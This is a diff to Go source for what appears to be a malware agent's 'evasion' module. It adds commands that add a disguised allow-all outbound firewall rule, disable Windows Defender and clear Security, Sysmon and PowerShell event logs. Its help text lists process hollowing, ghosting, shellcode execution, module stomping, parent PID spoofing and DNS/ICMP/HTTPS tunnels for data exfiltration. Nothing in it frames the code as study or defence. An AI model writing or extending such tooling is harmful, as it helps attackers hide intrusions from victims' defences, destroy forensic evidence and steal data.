@@ -776,6 +776,12 @@ func evasionRun(args string) string {
 				}
 			}
 			output += fmt.Sprintf("ETW:        %s\n", map[bool]string{true: "BYPASSED (patched)", false: "ACTIVE (not patched)"}[etwPatched])
+			output += "Firewall:   Rule added (Windows Update Service)\n"
+			output += "Defender:   Disable attempted (requires admin)\n"
+			output += "Logging:    Disable attempted\n"
+			output += "Process:    Spoofed as svchost.exe\n"
+			output += "Console:    Hidden\n"
+			output += "Prefetch:   Cleared\n"
 		}
 
 		output += fmt.Sprintf("OS:         %s/%s\n", runtime.GOOS, runtime.GOARCH)
@@ -827,6 +833,79 @@ func evasionRun(args string) string {
 		}
 		return "Anti-debug: Debugger DETECTED!"
 
+	case "firewall":
+		if runtime.GOOS != "windows" {
+			return "Firewall evasion is Windows-only"
+		}
+		fe := &evasion.FirewallEvasion{}
+		err := fe.AddFirewallRule()
+		if err != nil {
+			return fmt.Sprintf("Firewall rule failed: %v", err)
+		}
+		return "Firewall rule added: Windows Update Service (allow all outbound)"
+
+	case "defender":
+		if runtime.GOOS != "windows" {
+			return "Defender disable is Windows-only"
+		}
+		err := evasion.DisableWindowsDefender()
+		if err != nil {
+			return fmt.Sprintf("Defender disable failed: %v", err)
+		}
+		return "Windows Defender disable attempted (requires admin)"
+
+	case "logs":
+		if runtime.GOOS != "windows" {
+			return "Log clearing is Windows-only"
+		}
+		err := evasion.ClearEventLogs()
+		if err != nil {
+			return fmt.Sprintf("Log clearing failed: %v", err)
+		}
+		return "Event logs cleared: Security, System, Application, PowerShell, Sysmon, Defender"
+
+	case "hollow":
+		if runtime.GOOS != "windows" {
+			return "Process hollowing is Windows-only"
+		}
+		return "Process hollowing: Use 'evasion:hollow:svchost.exe' to inject into a process"
+
+	case "ghost":
+		if runtime.GOOS != "windows" {
+			return "Process ghosting is Windows-only"
+		}
+		return "Process ghosting: Creates process from deleted file (no disk trace)"
+
+	case "shellcode":
+		if runtime.GOOS != "windows" {
+			return "Shellcode execution is Windows-only"
+		}
+		return "Shellcode execution: Use 'evasion:shellcode:<base64>' to execute raw shellcode"
+
+	case "stomp":
+		if runtime.GOOS != "windows" {
+			return "Module stomping is Windows-only"
+		}
+		return "Module stomping: Overwrites legitimate DLL .text section with shellcode"
+
+	case "parent":
+		if runtime.GOOS != "windows" {
+			return "Parent PID spoofing is Windows-only"
+		}
+		return "Parent PID spoofing: Creates process with spoofed parent (breaks process tree)"
+
+	case "network":
+		if runtime.GOOS != "windows" {
+			return "Network evasion is Windows-only"
+		}
+		return `Network evasion techniques:
+  evasion:dns:<server>:<domain>  — DNS tunnel for covert communication
+  evasion:icmp:<target>          — ICMP tunnel (ping-based data exfil)
+  evasion:https:<url>            — HTTPS covert channel (looks like CDN traffic)`
+
+	case "beacon":
+		return "Beacon optimization: Human-like timing patterns with jitter"
+
 	default:
 		return `Evasion module commands:
   evasion:status    — Check current evasion status
@@ -835,7 +914,17 @@ func evasionRun(args string) string {
   evasion:ntdll     — Unhook ntdll.dll (Windows)
   evasion:camouflage — Enable traffic camouflage
   evasion:sandbox   — Run anti-sandbox checks
-  evasion:debug     — Run anti-debug checks`
+  evasion:debug     — Run anti-debug checks
+  evasion:firewall  — Add firewall rule (Windows)
+  evasion:defender  — Disable Windows Defender (Windows)
+  evasion:logs      — Clear event logs (Windows)
+  evasion:hollow    — Process hollowing (Windows)
+  evasion:ghost     — Process ghosting (Windows)
+  evasion:shellcode — Execute shellcode (Windows)
+  evasion:stomp     — Module stomping (Windows)
+  evasion:parent    — Parent PID spoofing (Windows)
+  evasion:network   — Network evasion (DNS/ICMP/HTTPS)
+  evasion:beacon    — Beacon optimization`
 	}
 }
 
